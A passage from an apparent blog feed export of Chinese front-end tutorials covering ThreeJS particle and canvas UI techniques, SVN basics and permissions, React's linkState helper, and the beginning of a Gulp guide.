<code>_gatherParticles(particle)</code>，在这里通过定时器将动画设置为分为两批执行。</p><p><code>_gatherParticles(particle)</code> 控制单个粒子实例，将单个粒子位置与大小在一定范围内的随机初始化，其中粒子出现的距离范围为<code>(1, 8)</code>，缩放的大小范围为<code>(1, 1.8)</code>，且只随机出现在瓶身底部平面之上的四个象限内。设置了初始位置之后，开始在随机一段时间后执行聚合动画，当粒子的聚合动画执行完毕后，会检测当前瓶身的状态，如果 <code>bottle.gathering === true</code>，则表明粒子聚合动画仍在执行，则重新调用 <code>_gatherParticles(particle)</code>，直到 <code>bottle.gathering !== true</code>，停止粒子的运动。</p><p>为了停止粒子的运动，使用 <code>resetGatherParticles()</code> 方法，将粒子队列中所有的粒子 <code>gathering</code> 属性设置为 <code>false</code>。</p><p>当用户按压屏幕，在瓶身进行 <code>shrink</code> 的过程时执行 <code>gatherParticles()</code> 开始聚合粒子。当用户手指离开屏幕，在瓶身进行 <code>flying</code> 的过程时执行 <code>resetGatherParticles()</code> 停止聚合粒子。</p><h3 id="粒子发散-Scatter"><a href="#粒子发散-Scatter" class="headerlink" title="粒子发散 Scatter"></a>粒子发散 Scatter</h3><p><img src="http://img.cdn.esunr.xyz/markdown/20190905110609.png" alt="20190905110609.png"></p><p>与粒子聚合相似，在 <code>bottle.js</code> 中 <code>scatterParticles()</code> 负责设置粒子的聚合状态，在这里只使用10个白色粒子完成发散动画即可。</p><p><code>_scatterParticle(particle)</code> 负责单个粒子实体进行发散动画，在初始化过程中，其距离的设置与聚合粒子不一样，由于其贴近瓶身发散，所以粒子距瓶身的距离更近，距离范围为 <code>(1, 2)</code>。同时其动画执行的时间更短，运动的距离更远。</p><p>由于粒子发散的动画是单次的，所有粒子在动画执行完毕后即可将自身的 <code>scattering</code> 与 <code>visiable</code> 属性设置为 <code>false</code>，无需要重复调用自身动画。</p><h1 id="UI绘制"><a href="#UI绘制" class="headerlink" title="UI绘制"></a>UI绘制</h1><p>场景切换可以通过MVC系统，调用每个页面实例中传入的callbacks，从而切换游戏主场景与游戏菜单UI。</p><p>UI通常是二维平面，所以我们可以将UI的绘制转为2d Canvas的绘制。在 ThreeJS 中，可以将一个2d的离屏 Canvas 作为纹理绘制到一个3D平面上，这利用到了 ThreeJS 的 CanvasTexture，示例如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个离屏Canvas</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">canvas</span> = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;canvas&#x27;</span>)</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">canvas</span>.<span class="property">width</span> = <span class="variable language_">this</span>.<span class="property">width</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">canvas</span>.<span class="property">height</span> = <span class="variable language_">this</span>.<span class="property">height</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个3D平面</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">texture</span> = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">CanvasTexture</span>(<span class="variable language_">this</span>.<span class="property">canvas</span>)</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">material</span> = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">MeshBasicMaterial</span>(&#123; <span class="attr">map</span>: <span class="variable language_">this</span>.<span class="property">texture</span>, <span class="attr">transparent</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">geometry</span> = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">PlaneGeometry</span>(sceneConf.<span class="property">frustumSize</span> * <span class="number">2</span>, aspect * sceneConf.<span class="property">frustumSize</span> * <span class="number">2</span>)</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">obj</span> = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Mesh</span>(<span class="variable language_">this</span>.<span class="property">geometry</span>, <span class="variable language_">this</span>.<span class="property">material</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取离屏Canvas的上下文对象</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">context</span> = <span class="variable language_">this</span>.<span class="property">canvas</span>.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>)</span><br></pre></td></tr></table></figure><p>要注意的是，作为UI使用的离屏Canvas出现的相对坐标不是世界坐标系，而是相机，因为UI始终是正对相机的，所以我们将绘制了UI的平面添加到相机对象上，同时设置其位置属性，让其在相机的可视范围内：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">camera</span>.<span class="title function_">add</span>(<span class="variable language_">this</span>.<span class="property">obj</span>)</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">obj</span>.<span class="property">position</span>.<span class="property">z</span> = <span class="number">80</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 项目实践 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Canvas </tag>
            
            <tag> 微信小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SVN快速使用指南</title>
      <link href="/2019/08/4e97f3affc24.html"/>
      <url>/2019/08/4e97f3affc24.html</url>
      
        <content type="html"><![CDATA[<h1 id="0-svn-概念"><a href="#0-svn-概念" class="headerlink" title="0. svn 概念"></a>0. svn 概念</h1><p>SVN 基础概念：</p><ul><li><strong>repository（源代码库）</strong>：源代码统一存放的地方</li><li><strong>checkout（提取）</strong>：当你手上没有源代码的时候，你需要从 repository checkout 一份</li><li><strong>commit（提交）</strong>：当你已经修改了代码，你就需要 commit 到 repository</li><li><strong>update（更新）</strong>：当你已经 checkout 了一份源代码，update 一下你就可以和 repository 上的源代码同步，你手上的代码就会有最新的变更</li></ul><p>SVN 生命周期：</p><ul><li><strong>创建版本库</strong>：create 操作创建一个新的版本库，版本库用于存放文件，包括了每次修改的历史。</li><li><strong>检出</strong>：checkout 操作从版本库创建一个工作副本，作为开发者私人的工作空间，可以进行内容的修改，然后提交到版本库中。</li><li><strong>更新</strong>：update 操作更新版本库，将工作副本与版本库进行同步。因为版本库是整个团队共用的，当其他人提交了改动，你的工作副本就会过期。</li><li><strong>执行变更</strong>：检出之后，可以进行添加、编辑、删除、重命名、移动文件/目录等变更操作。当最终执行了 commit 操作后，就对版本库进行了相应变更。</li><li><strong>复查变化</strong>：当你对工作副本进行了一些修改后，你的工作副本就会比版本库新，在 commit 操作之前使用 status/diff 操作复查下你的修改是一个好的习惯。</li><li><strong>修复错误</strong>：如果你对工作副本做了许多修改，当时不想要这些修改了，revert 操作可以重置工作副本的修改，恢复到原始状态。</li><li><strong>解决冲突</strong>：合并的时候可能发生冲突，使用 merge 操作进行合并。因为 SVN 合并是以行为单位的，只要不是修改的同一行，SVN 都会自动合并，如果是同一行，SVN 会提示冲突，需要手动进行确认修改，合并代码。其中 resolve 操作可以帮助找出冲突。</li><li><strong>提交更改</strong>：将文件/目录添加到待变更列表，使用 commit 操作将更改从工作副本更新到版本库，提交是添加注释说明，是个好的习惯。</li></ul><h1 id="1-svn的安装"><a href="#1-svn的安装" class="headerlink" title="1.svn的安装"></a>1.svn的安装</h1><p>svn 需要安装 sliksvn 才能在命令行中使用 <code>svn</code> 指令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svn --version</span><br></pre></td></tr></table></figure><h1 id="2-svn服务指令"><a href="#2-svn服务指令" class="headerlink" title="2.svn服务指令"></a>2.svn服务指令</h1><h2 id="2-1-创建指令"><a href="#2-1-创建指令" class="headerlink" title="2.1 创建指令"></a>2.1 创建指令</h2><p>创建指令是创建出一个 SVN 项目服务端的源代码仓库，用来记录当前项目的版本信息，同时也为了记录一些权限相关的配置信息。（注意：每一个项目都要有一个单独的源代码仓库）</p><p><strong>​指令：</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svnadmin create [Path]</span><br></pre></td></tr></table></figure><p><strong>创建出的目录：</strong></p><ul><li>conf/        设置权限时，需要设置conf目录</li><li>db/            存储svn自身的数据</li><li>hooks/    存放钩子，在每次提交时可以触发一定时间</li><li>locks/</li><li>format</li><li>README.txt</li></ul><h2 id="2-2-启动服务器端程序"><a href="#2-2-启动服务器端程序" class="headerlink" title="2.2 启动服务器端程序"></a>2.2 启动服务器端程序</h2><p>在创建了一个 SVN 项目服务端的源代码仓库后，服务器端可以通过 <code>svnserve</code> 来启动当前的 SVN 服务，提供给客户端进行连接。</p><h3 id="2-2-1-将svn按指令方式启动​"><a href="#2-2-1-将svn按指令方式启动​" class="headerlink" title="2.2.1 将svn按指令方式启动​"></a>2.2.1 将svn按指令方式启动​</h3><p><strong>指令：</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svnserve -d -r [Path]</span><br></pre></td></tr></table></figure><p>-d 表示后台执行，-r 标识版本根目录，服务器将会运行在 3690 端口</p><p>启动的方式有两种，一种为 <strong>直接指定到版本库（单库模式）</strong> 还有一种为 <strong>指定到版本库的上级目录（多库模式）</strong>，这两种模式的区别在于访问时是否需要提供项目名为路由作为区分。举个例子，当我们在服务器端创建一个 <code>svn</code> 目录，用于做 SVN 的项目仓库存储，然后我们将要使用 SVN 管理两个项目，一个项目名为 OA 一个项目名为 SHOP，因此我们在 <code>svn</code> 目录下创建了 <code>OA</code> 与  <code>SHOP</code> 目录，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">svn</span><br><span class="line">|- OA</span><br><span class="line">|- SHOP</span><br></pre></td></tr></table></figure><p>成功创建之后，我们分别使用 <code>svnadmin</code> 指令创建仓库：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">svnadmin create ./svn/OA</span><br><span class="line">svnadmin create ./svn/SAHOP</span><br></pre></td></tr></table></figure><p>之后我们要使用 <code>svnserve</code> 指令运行 svn 服务，但是指定不同的 Path 会开启不同的模式，如我们运行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svnserve -d -r ./svn/OA</span><br></pre></td></tr></table></figure><p>那么此时运行的就是单库模式，我们直接访问 <code>svn checkout svn://localhost</code> 就可以访问到 OA 项目的 SVN 服务，但是此时没有办法访问到 SHOP 的 SVN 服务。</p><blockquote><p>svn checkout 指令可以拉取服务端代码</p></blockquote><p>但是如果我们运行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svnserve -d -r ./svn</span><br></pre></td></tr></table></figure><p>那么此时运行的就是多库模式，我们需要访问 <code>svn checkout svn://localhost/OA</code> 才可以访问到 OA 项目的 SVN 服务，但是使用 <code>svn checkout svn://localhost/SHOP</code> 可以访问到 SHOP 项目的服务了。</p><h3 id="2-2-2-将svn作为系统服务器启动（可后台运行）"><a href="#2-2-2-将svn作为系统服务器启动（可后台运行）" class="headerlink" title="2.2.2 将svn作为系统服务器启动（可后台运行）"></a>2.2.2 将svn作为系统服务器启动（可后台运行）</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create SVNService binpath= <span class="string">&quot;C:\Program Files\SlikSvn\bin\svnserve.exe --service -r D:\SvnRep&quot;</span> start= auto depend= Tcpip</span><br></pre></td></tr></table></figure><p>PS：这些指令的等号左边没空格，等号右边有一个空格</p><h1 id="3-svn操作指令"><a href="#3-svn操作指令" class="headerlink" title="3.svn操作指令"></a>3.svn操作指令</h1><h2 id="3-1-取出版本（检出）"><a href="#3-1-取出版本（检出）" class="headerlink" title="3.1 取出版本（检出）"></a>3.1 取出版本（检出）</h2><p>创建两个工作空间，选择其中一个工作空间，然后检出服务器的项目</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ./DevWorkSpace/WorkSpaceSvn</span><br><span class="line"><span class="built_in">mkdir</span> SpaceJerry</span><br><span class="line"><span class="built_in">mkdir</span> SpaceTom</span><br><span class="line"><span class="built_in">cd</span> SpaceJerry</span><br><span class="line">svn checkout svn://localhost/OA</span><br><span class="line"></span><br><span class="line">&gt;取出版本0</span><br></pre></td></tr></table></figure><h2 id="3-2-提交指令"><a href="#3-2-提交指令" class="headerlink" title="3.2 提交指令"></a>3.2 提交指令</h2><h3 id="设置权限"><a href="#设置权限" class="headerlink" title="设置权限"></a>设置权限</h3><p>在服务器端存放的项目地址下，打开 <code>conf/svnserve.conf</code> 文件，并进行权限编辑，将匿名写入权限开启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">anon-access = write # 将匿名访问开启</span><br><span class="line"># auth-access = write</span><br></pre></td></tr></table></figure><h3 id="提交版本"><a href="#提交版本" class="headerlink" title="提交版本"></a>提交版本</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 新创建一个文件</span></span><br><span class="line">vi text.txt</span><br><span class="line"><span class="comment"># 将文件加入版本控制系统</span></span><br><span class="line">svn add text.txt</span><br><span class="line"><span class="comment"># 填写日志信息并提交</span></span><br><span class="line">svn commit -m <span class="string">&quot;My first commit&quot;</span> text.txt</span><br></pre></td></tr></table></figure><h3 id="更新指令"><a href="#更新指令" class="headerlink" title="更新指令"></a>更新指令</h3><p>当服务器上的代码发生了变动，可以使用如下指令对本地项目进行升级：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svn update</span><br></pre></td></tr></table></figure><h1 id="4-解决冲突"><a href="#4-解决冲突" class="headerlink" title="4.解决冲突"></a>4.解决冲突</h1><h2 id="4-1-冲突产生的前置条件"><a href="#4-1-冲突产生的前置条件" class="headerlink" title="4.1 冲突产生的前置条件"></a>4.1 冲突产生的前置条件</h2><p>Jerry 与 Tom 同时更新到项目的 9.0 版本后开始工作；</p><p>当 Jerry 完成工作后提交项目，此时项目升级到了 10.0；</p><p>Tom 仍在 9.0 版本工作，当 Tom 的工作完成后进行提交时，会显示当前版本<strong>已过时。</strong></p><p>​这时，我们需要先更新版本再提交，但是当 svn 的 diff 算法检查出新的代码与当前已更改的代码发生了冲突，svn 就会产生提交冲突。</p><h2 id="4-2-冲突产生的文件"><a href="#4-2-冲突产生的文件" class="headerlink" title="4.2 冲突产生的文件"></a>4.2 冲突产生的文件</h2><ul><li>*.main  是自己的文件</li><li>*.rx         x代表了在x版本时代码的状态</li></ul><h1 id="4-权限"><a href="#4-权限" class="headerlink" title="4.权限"></a>4.权限</h1><h2 id="4-1-开启授权访问"><a href="#4-1-开启授权访问" class="headerlink" title="4.1 开启授权访问"></a>4.1 开启授权访问</h2><p>打开 `conf/svnserve.conf` 文件，关闭匿名访问，开启授权访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">anon-access = none    # 必须将匿名访问设置为none，否则提交历史将不可见</span><br><span class="line">auth-access = write   # 开启授权访问</span><br><span class="line">password-db = passwd  # 存放密码文件</span><br><span class="line">authz-db = authz      # 存放授权信息的文件</span><br></pre></td></tr></table></figure><h2 id="4-2-设置用户"><a href="#4-2-设置用户" class="headerlink" title="4.2 设置用户"></a>4.2 设置用户</h2><p>打开 `conf/passwd` 文件，设置用户名与密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[users]</span><br><span class="line">tom = 123456</span><br><span class="line">jerry = 123456</span><br><span class="line">ceshi = 123456</span><br></pre></td></tr></table></figure><h2 id="4-3-设置权限"><a href="#4-3-设置权限" class="headerlink" title="4.3 设置权限"></a>4.3 设置权限</h2><p>打开 `conf/authz` 文件，对用户进行分组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[groups]</span><br><span class="line">kaifa = tom,jerry</span><br></pre></td></tr></table></figure><p>分组后可以对在该组的用户集体进行读写权限设置，设置的方式为对文件路径设置权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 设置权限目录</span><br><span class="line">[/]</span><br><span class="line"># 为用户组设置读写权限</span><br><span class="line">@kaifa = rw</span><br><span class="line"># 为单个用户设置读权限</span><br><span class="line">ceshi = r</span><br><span class="line"># 设置 * 可以做到权限屏蔽，除了以上的用户，其余用户均没有读写权限权限</span><br><span class="line">* = </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SVN </tag>
            
            <tag> 快速使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React中修改父组件传入的props</title>
      <link href="/2019/07/4f5e71e0f2ae.html"/>
      <url>/2019/07/4f5e71e0f2ae.html</url>
      
        <content type="html"><![CDATA[<h1 id="需求场景"><a href="#需求场景" class="headerlink" title="需求场景"></a>需求场景</h1><p>当我们在父组件中调用子组件时，通常会将<strong>父组件的 state 数据</strong>，传递给<strong>子组件的 props 属性</strong>中，但是我们通常无法在子组件内改变外部传入的 props 属性，进而改变父组件的 state 属性。</p><p>这时 <code>react-link-state</code> 组件可以帮助我们。</p><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>引入：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> linkState <span class="keyword">from</span> <span class="string">&#x27;react-link-state&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在父组件中设置子组件时，指定要关联的 state</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Fater</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">props</span>)&#123;</span><br><span class="line">        <span class="variable language_">super</span>(props);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">            <span class="attr">data</span>: <span class="string">&#x27;value&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">             ...</span></span><br><span class="line"><span class="language-xml">             <span class="tag">&lt;<span class="name">Son</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                <span class="attr">sonData</span>=<span class="string">&#123;linkState(this,</span> &#x27;<span class="attr">data</span>&#x27;)&#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">             /&gt;</span></span></span><br><span class="line"><span class="language-xml">             ...</span></span><br><span class="line"><span class="language-xml">             <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在子组件中改变父组件传入的props:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Fater</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">props</span>)&#123;</span><br><span class="line">        <span class="variable language_">super</span>(props);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">handelChange</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">props</span>.<span class="property">sondata</span>.<span class="title function_">requestChange</span>(<span class="string">&#x27;newData&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onClikc</span>=<span class="string">&#123;handelChange&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">             &#123;this.props.sonData.value&#125;</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><code>linkState()</code> 方法可以将父组件的 state 中的数据转化为一个 object，其含内部包含两个结构</p><ul><li><code>value</code> 用来存放源数据</li><li><code>requestChange()</code> 方法则是用于请求改变父组件的 state 数据</li></ul><p>这样我们就可以访问这个 object 来进行对应的数据获取和数据更改操作。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gulp快速使用指南</title>
      <link href="/2019/07/2c00dd47f4b5.html"/>
      <url>/2019/07/2c00dd47f4b5.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>Gulp学习版本为3.9.1</p></blockquote><h1 id="1-Gulp特点"><a href="#1-Gulp特点" class="headerlink" title="1. Gulp特点"></a>1. Gulp特点</h1><ul><li>任务化</li><li>基于流<ul><li>输入流</li><li>输出流</li></ul></li></ul><h1 id="2-API"><a href="#2-API" class="headerlink" title="2. API"></a>2. API</h1><ul><li><code>gulp.src(globs[, options])</code> 输入文件：输入流</li><li><code>gulp.dest(path[, options])</code> 输出文件：输出流</li><li><code>gulp.task(name[, deps], fn)</code> 任务化</li><li><code>gulp.watch(glob[, opts], tasks)</code> 监视</li></ul><h1 id="3-目录结构"><a href="#3-目录结构" class="headerlink" title="3. 目录结构"></a>3. 目录结构</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">|- dist</span><br><span class="line">|- src</span><br><span class="line">    |- js</span><br><span class="line">    |- css</span><br><span class="line">    |- less</span><br><span class="line">|- index.html</span><br><span class="line">|- gulpfile.js</span><br><span class="line">|- package.json</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;gulp_study&quot;,</span><br><span class="line">        &quot;version&quot;: &quot;1.0.0&quot;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="4-安装gulp"><a href="#4-安装gulp" class="headerlink" title="4. 安装gulp"></a>4. 安装gulp</h1><ul><li>全局安装：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install gulp -g</span><br></pre></td></tr></table></figure><ul><li>局部安装：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install gulp -S</span><br></pre></td></tr></table></figure><ul><li>配置编码</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gulpfile.js</span></span><br><span class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">&#x27;gulp&#x27;</span>)</span><br><span class="line"><span class="comment">// 注册任务</span></span><br><span class="line">gulp.<span class="title function_">task</span>(<span class="string">&#x27;任务名&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 配置任务的操作</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">gulp.<span class="title function_">task</span>(<span class="string">&#x27;default&#x27;</span>, [])</span><br></pre></td></tr></table></figure><p>之后我们可以使用 <code>gulp 任务名</code> 来执行某个特定的任务，或者使用 <code>gulp</code> 来执行默认的任务序列<strong>（gulp4 已弃用）</strong></p><h1 id="5-常用的gulp插件"><a href="#5-常用的gulp插件" class="headerlink" title="5. 常用的gulp插件"></a>5. 常用的gulp插件</h1><ul><li><p>sass的编译（<code>gulp-sass</code>）</p></li><li><p>less编译 （<code>gulp-less</code>）</p></li><li><p>重命名（为压缩的文件加’.min’）（<code>gulp-rename</code>）</p></li><li><p>自动添加css前缀（<code>gulp-autoprefixer</code>）</p></li><li><p>压缩css（<code>gulp-minify-css</code>）</p></li><li><p>js代码校验（<code>gulp-jshint</code>）</p></li><li><p>合并js/css文件（<code>gulp-concat</code>）</p></li><li><p>压缩js代码（<code>gulp-uglify</code>）</p></li><li><p>压缩图片（<code>gulp-imagemin</code>）</p></li><li><p>自动刷新页面（<code>gulp-livereload</code>，谷歌浏览器亲测，谷歌浏览器需安装livereload插件）</p></li><li><p>图片缓存，只有图片替换了才压缩（<code>gulp-cache</code>）</p></li><li><p>更改提醒（<code>gulp-notify</code>）</p></li></ul><h1 id="6-合并压缩js任务"><a href="#6-合并压缩js任务" class="headerlink" title="6. 合并压缩js任务"></a>6. 合并压缩js任务</h1><h2 id="6-1-配置任务"><a href="#6-1-配置任务" class="headerlink" title="6.1 配置任务"></a>6.1 配置任务</h2><p>我们在 <code>src/js</code> 文件夹中创建两个js文件，分别对应了两个方法，我们想要将这两个js文件合并为一个文件，需要在 <code>gulpfile.js</code> 文件中定义任务流：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gulp.<span class="title function_">task</span>(<span class="string">&#x27;js&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 深度遍历</span></span><br><span class="line">    <span class="comment">// return gulp.src(&#x27;src/js/**/*.js&#x27;) </span></span><br><span class="line">    <span class="comment">// 浅度遍历</span></span><br><span class="line">    <span class="keyword">return</span> gulp.<span class="title function_">src</span>(<span class="string">&#x27;src/js/*.js&#x27;</span>) <span class="comment">// 找到目标文件，将数据读取到gulp的内存中</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="6-2-下载和使用插件"><a href="#6-2-下载和使用插件" class="headerlink" title="6.2 下载和使用插件"></a>6.2 下载和使用插件</h2><ol><li>安装插件</li></ol><p>当gulp读取文件到内存中后，会进行一系列操作，这些操作会用到gulp插件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install gulp-concat gulp-uglify gulp-rename --save-dev</span><br></pre></td></tr></table></figure><ol start="2"><li>引入插件</li></ol><p>引入插件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gulpfile.js</span></span><br><span class="line"><span class="keyword">var</span> concat = <span class="built_in">require</span>(<span class="string">&#x27;gulp-concat&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> uglify = <span 